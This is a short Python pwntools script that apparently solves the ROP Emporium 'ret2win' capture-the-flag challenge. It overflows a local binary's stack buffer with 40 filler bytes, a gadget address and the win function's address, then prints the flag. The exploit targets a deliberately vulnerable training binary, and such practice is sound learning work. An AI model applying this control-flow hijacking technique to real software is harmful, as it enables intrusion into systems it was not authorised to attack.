from pwn import *

# Initialize the ELF
elf = ELF('ret2win')

# Start a new process using the binary file
process = process(elf.path)

# Create the payload with the 40 bytes of filler 
payload = b'A' * 40 

# Add the address of the ROP gadget to the payload
payload += p64(0x000000000040053e)

# We can use the pwntools elf utilities to get the address of the ret2win function, which we will then add to the payload
payload += p64(elf.sym.ret2win)

# Send the payload to the process
process.send(payload)

# Receive the output and decode it from bytes to string
output = process.recvall()
output = output.decode('utf-8')

# Find the index of the flag in the output
index = output.find('ROPE{')

# Print the flag
flag = output[index:]
print(flag)
